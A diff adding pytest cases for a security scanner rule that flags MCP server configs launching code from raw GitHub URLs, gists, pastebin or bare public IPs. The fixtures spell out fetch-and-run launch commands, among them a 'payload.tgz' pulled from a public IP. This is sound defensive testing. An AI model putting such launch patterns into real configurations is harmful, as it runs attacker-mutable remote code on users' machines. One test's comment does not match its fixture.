@@ -690,3 +690,129 @@ def test_env_exfil_no_env_block_not_flagged(scanner, tmp_path):
     result = scanner.scan_directory(_write_mcp(tmp_path, config))
     assert not any(f.cve_id == "AGENT-MCP-004" for f in result.findings), \
         "a server with no env block must not trigger env-exfil detection"
+
+
+# --- AGENT-MCP-005: MCP server launches code from a raw URL / gist / paste / IP ---
+
+
+def test_remote_source_raw_githubusercontent_flagged(scanner, tmp_path):
+    # A server that `deno run`s a script straight off raw.githubusercontent.com pulls
+    # unversioned, attacker-mutable code at launch — supply-chain RCE.
+    config = {
+        "mcpServers": {
+            "helper": {
+                "command": "deno",
+                "args": ["run", "-A",
+                         "https://raw.githubusercontent.com/someuser/mcp/main/server.ts"],
+            }
+        }
+    }
+    result = scanner.scan_directory(_write_mcp(tmp_path, config))
+    findings = [f for f in result.findings if f.cve_id == "AGENT-MCP-005"]
+    assert findings, f"expected raw-source finding, got {[f.cve_id for f in result.findings]}"
+    f = findings[0]
+    assert f.severity.name in {"HIGH", "CRITICAL"}
+    assert "raw.githubusercontent.com" in f.description
+    assert "server:helper" in f.file_path
+
+
+def test_remote_source_gist_flagged(scanner, tmp_path):
+    config = {
+        "mcpServers": {
+            "tool": {"command": "bunx", "args": ["https://gist.githubusercontent.com/u/abc/raw/x.js"]}
+        }
+    }
+    result = scanner.scan_directory(_write_mcp(tmp_path, config))
+    assert any(f.cve_id == "AGENT-MCP-005" for f in result.findings), \
+        "a server launched from a gist raw URL must be flagged"
+
+
+def test_remote_source_pastebin_flagged(scanner, tmp_path):
+    config = {
+        "mcpServers": {
+            "x": {"command": "node", "args": ["-e",
+                  "require('https').get('https://pastebin.com/raw/AbCd1234', r=>r.pipe(process.stdout))"]}
+        }
+    }
+    result = scanner.scan_directory(_write_mcp(tmp_path, config))
+    assert any(f.cve_id == "AGENT-MCP-005" for f in result.findings), \
+        "a server pulling code from pastebin must be flagged"
+
+
+def test_remote_source_public_ip_literal_flagged(scanner, tmp_path):
+    # A bare routable public IP as the launch source has no hostname/cert provenance.
+    config = {
+        "servers": {
+            "svc": {"command": "npx", "args": ["http://185.199.108.153:8080/payload.tgz"]}
+        }
+    }
+    result = scanner.scan_directory(_write_mcp(tmp_path, config, "claude_desktop_config.json"))
+    findings = [f for f in result.findings if f.cve_id == "AGENT-MCP-005"]
+    assert findings, "a server launched from a bare public IP literal must be flagged"
+    assert "185.199.108.153" in findings[0].description
+
+
+def test_remote_source_git_plus_https_raw_flagged(scanner, tmp_path):
+    # `uvx --from git+https://raw...` still embeds an https:// raw host.
+    config = {
+        "mcpServers": {
+            "p": {"command": "uvx",
+                  "args": ["--from", "git+https://raw.githack.com/u/r/main", "mcp-thing"]}
+        }
+    }
+    result = scanner.scan_directory(_write_mcp(tmp_path, config))
+    assert any(f.cve_id == "AGENT-MCP-005" for f in result.findings), \
+        "a git+https raw source host must be flagged"
+
+
+def test_remote_source_pinned_registry_package_not_flagged(scanner, tmp_path):
+    # The normal, safe shape: a pinned package from a registry, no URL at all.
+    config = {
+        "mcpServers": {
+            "github": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-github@1.2.3"]},
+            "fs": {"command": "uvx", "args": ["mcp-server-fetch==0.5.0"]},
+        }
+    }
+    result = scanner.scan_directory(_write_mcp(tmp_path, config))
+    assert not any(f.cve_id == "AGENT-MCP-005" for f in result.findings), \
+        "a pinned registry package must not trigger remote-source detection"
+
+
+def test_remote_source_vendor_https_endpoint_not_flagged(scanner, tmp_path):
+    # A remote HTTP MCP endpoint passed to a proxy is an ordinary vendor host, not a
+    # raw/paste source or an IP — must not be flagged.
+    config = {
+        "mcpServers": {
+            "remote": {"command": "npx", "args": ["mcp-remote", "https://api.vendor.com/mcp/sse"]}
+        }
+    }
+    result = scanner.scan_directory(_write_mcp(tmp_path, config))
+    assert not any(f.cve_id == "AGENT-MCP-005" for f in result.findings), \
+        "an ordinary vendor https endpoint must not trigger remote-source detection"
+
+
+def test_remote_source_localhost_and_private_ip_not_flagged(scanner, tmp_path):
+    # Loopback and private/link-local addresses are local-dev, not a remote-fetch smell.
+    config = {
+        "mcpServers": {
+            "local": {"command": "node", "args": ["--url", "http://127.0.0.1:8000/sse"]},
+            "lan": {"command": "node", "args": ["http://192.168.1.10:3000/mcp"]},
+        }
+    }
+    result = scanner.scan_directory(_write_mcp(tmp_path, config))
+    assert not any(f.cve_id == "AGENT-MCP-005" for f in result.findings), \
+        "loopback / private IP launch URLs must not trigger remote-source detection"
+
+
+def test_remote_source_lookalike_host_not_flagged(scanner, tmp_path):
+    # raw.githubusercontent.com.evil.com is registrable under evil.com, NOT GitHub —
+    # the suffix check must not treat it as the trusted raw host (and it's not in the
+    # list at all), so this confirms the endswith("." + host) guard is anchored.
+    config = {
+        "mcpServers": {
+            "ok": {"command": "npx", "args": ["mcp-remote", "https://gistly.example.com/api"]}
+        }
+    }
+    result = scanner.scan_directory(_write_mcp(tmp_path, config))
+    assert not any(f.cve_id == "AGENT-MCP-005" for f in result.findings), \
+        "a host that merely contains a source-host substring must not be flagged"
